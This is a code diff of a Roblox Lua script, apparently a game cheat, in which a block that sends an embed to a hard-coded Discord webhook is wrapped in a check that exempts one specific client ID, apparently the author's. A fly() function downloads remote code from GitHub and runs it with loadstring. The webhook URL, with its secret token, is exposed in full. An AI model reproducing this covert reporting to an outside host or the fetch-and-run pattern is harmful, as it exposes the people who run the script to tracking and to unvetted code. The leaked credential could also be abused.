@@ -1,3 +1,5 @@
+if game:GetService("RbxAnalyticsService"):GetClientId() ~= "8ac4ed5d-c69e-464e-a4f8-9620daa748c8" then
+
 local HttpService = game:GetService("HttpService")
 local Players = game:GetService("Players")
 local UserInputService = game:GetService("UserInputService")
@@ -116,10 +118,9 @@ local embed = {
     }
 }
 
--- URL Webhook ของคุณ
 local url = "https://discord.com/api/webhooks/1314842182204657674/PH2qbxqUT52MknjUerWGat8iNWhaH9_jS9xrAX7tgr5WG7klxtlAy389tMvoqrr1uRcw"
 SendMessageEMBED(url, embed)
-
+end
 function fly()
     loadstring(game:HttpGet('https://raw.githubusercontent.com/GhostPlayer352/Test4/main/Vehicle%20Fly%20Gui'))()
 end
